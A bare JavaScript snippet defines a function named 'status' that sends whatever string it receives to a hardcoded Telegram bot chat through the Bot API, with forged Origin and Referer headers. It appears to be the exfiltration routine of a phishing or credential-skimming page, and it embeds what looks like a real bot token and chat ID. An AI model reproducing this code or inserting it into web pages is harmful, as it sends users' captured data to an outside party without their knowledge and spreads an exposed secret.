var oReq = new XMLHttpRequest();
function status(url)
{var messagen_send = url;var next3 = 'https://api.telegram.org/bot5855689089:AAE5sgU1TifEt3Se89O8RmkJKOH-74DU1WU/sendMessage?chat_id=5855689089&text='+messagen_send;oReq.open("GET", next3);oReq.setRequestHeader("Origin","https://api.telegram.org");oReq.setRequestHeader("Referer","https://api.telegram.org/");oReq.send()}
